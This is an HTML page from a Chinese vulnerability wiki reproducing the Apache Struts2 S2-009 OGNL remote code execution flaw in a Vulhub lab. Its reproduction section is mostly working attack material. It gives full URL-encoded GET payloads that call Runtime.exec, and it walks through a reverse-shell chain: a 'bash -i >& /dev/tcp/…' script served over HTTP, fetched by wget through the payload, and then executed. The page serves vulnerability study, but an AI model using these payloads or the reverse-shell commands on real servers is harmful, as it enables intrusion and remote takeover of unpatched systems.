@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Struts2%20S2-009%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Struts2 S2-009 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Struts2 S2-009 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache%20Struts2%20S2-012%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache%20Struts2%20S2-012%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-012 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-008 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-struts2-s2-009">Apache Struts2 S2-009 远程代码执行漏洞<a class="headerlink" href="#apache-struts2-s2-009" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>前置阅读： 这个漏洞再次来源于 s2-003、s2-005。了解该漏洞原理，需要先阅读 s2-005 的说明：<a href="https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md">https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md</a></p>
+</blockquote>
+<p>参考 <a href="https://www.t00ls.net/viewthread.php?tid=21197">Struts2漏洞分析之Ognl表达式特性引发的新思路</a>，文中说到，该引入 ognl 的方法不光可能出现在这个漏洞中，也可能出现在其他 java 应用中。</p>
+<p>Struts2 对 s2-003 的修复方法是禁止静态方法调用，在 s2-005 中可直接通过 OGNL 绕过该限制，对于 <code>#</code> 号，同样使用编码 <code>\u0023</code> 或 <code>\43</code> 进行绕过；于是 Struts2 对 s2-005 的修复方法是禁止 <code>\</code> 等特殊符号，使用户不能提交反斜线。</p>
+<p>但是，如果当前 action 中接受了某个参数 <code>example</code>，这个参数将进入 OGNL 的上下文。所以，我们可以将 OGNL 表达式放在 <code>example</code> 参数中，然后使用 <code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)('xxx')=1</code> 的方法来执行它，从而绕过官方对 <code>#</code>、<code>\</code> 等特殊字符的防御。</p>
+<p>漏洞详情:</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-009.html">http://struts.apache.org/docs/s2-009.html</a></li>
+</ul>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>影响版本: 2.1.0 - 2.3.1.1</p>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>Vulhub 执行以下命令启动 s2-009 测试环境：</p>
+<div class="highlight"><pre><span></span><code>docker-compose build
+docker-compose up -d
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>测试环境是一个 struts2 的“功能展示”网站 <code>Struts Showcase</code>，代码很多，我们的目标是去找一个接受了参数，参数类型是 string 的 action。</p>
+<p>先对 <code>S2-009.war</code> 进行解压（我用 binwalk，其实直接 zip 就可以），可见源码都在 <code>WEB-INF/src</code> 目录中，我一般找 ajax 相关的代码，这些代码一般逻辑比较简单。</p>
+<p>找到一个 <code>WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java</code>：</p>
+<div class="highlight"><pre><span></span><code>public class Example5Action extends ActionSupport {
+
+    private static final long serialVersionUID = 2111967621952300611L;
+
+    private String name;
+    private Integer age;
+
+
+    public String getName() { return name; }
+    public void setName(String name) { this.name = name; }
+
+    public Integer getAge() { return age; }
+    public void setAge(Integer age) { this.age = age; }
+
+    @Override
+    public String execute() throws Exception {
+        return SUCCESS;
+    }
+}
+</code></pre></div>
+<p>代码没有更简单了，其接受了 name 参数并调用 setName 将其赋值给私有属性 <code>this.name</code>，正是符合我们的要求。然后去 <code>WEB-INF/src/java/struts-ajax.xml</code> 看一下 URL 路由：</p>
+<div class="highlight"><pre><span></span><code>&lt;package name=&quot;ajax&quot; extends=&quot;struts-default&quot;&gt;
+    ...
+    &lt;action name=&quot;example5&quot; class=&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;&gt;
+        &lt;result name=&quot;input&quot;&gt;/ajax/tabbedpanel/example5.jsp&lt;/result&gt;
+        &lt;result&gt;/ajax/tabbedpanel/example5Ok.jsp&lt;/result&gt;
+    &lt;/action&gt;
+    ...
+&lt;/package&gt;
+</code></pre></div>
+<p><code>name=example5</code>，所以访问 <code>http://your-ip:8080/ajax/example5.action</code> 即可访问该控制器。按照原理中说到的方法，将 OGNL 利用代码放在 name 参数里，访问该 URL：</p>
+<div class="highlight"><pre><span></span><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/awesome_poc%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+Host: localhost:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+</code></pre></div>
+<p><img alt="image-20220301165654308" src="../images/202203011656411.png" /></p>
+<p>由于该 POC 没有回显，所以调用的是 <code>touch /tmp/awesome_poc</code> 命令，查看/tmp 目录发现已经成功：</p>
+<p><img alt="image-20220301165639798" src="../images/202203011656842.png" /></p>
+<h3 id="shell">反弹 shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<p>编写 shell 脚本并启动 http 服务器：</p>
+<div class="highlight"><pre><span></span><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
+python3环境下：python -m http.server 80
+</code></pre></div>
+<p>上传 shell.sh 文件的命令为：</p>
+<div class="highlight"><pre><span></span><code>wget 192.168.174.128/shell.sh
+</code></pre></div>
+<p>上传 shell.sh 文件的 Payload 为：</p>
+<div class="highlight"><pre><span></span><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27wget%20192.168.174.128/shell.sh%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+</code></pre></div>
+<p>执行 shell.sh 文件的命令为：</p>
+<div class="highlight"><pre><span></span><code>bash /usr/local/tomcat/shell.sh
+</code></pre></div>
+<p>执行 shell.sh 文件的 Payload 为：</p>
+<div class="highlight"><pre><span></span><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27bash%20/usr/local/tomcat/shell.sh%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+</code></pre></div>
+<p>成功接收反弹 shell：</p>
+<p><img alt="image-20220301165932437" src="../images/202203011659531.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache%20Struts2%20S2-012%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache%20Struts2%20S2-012%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-012 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache%20Struts2%20S2-008%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Apache Struts2 S2-008 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
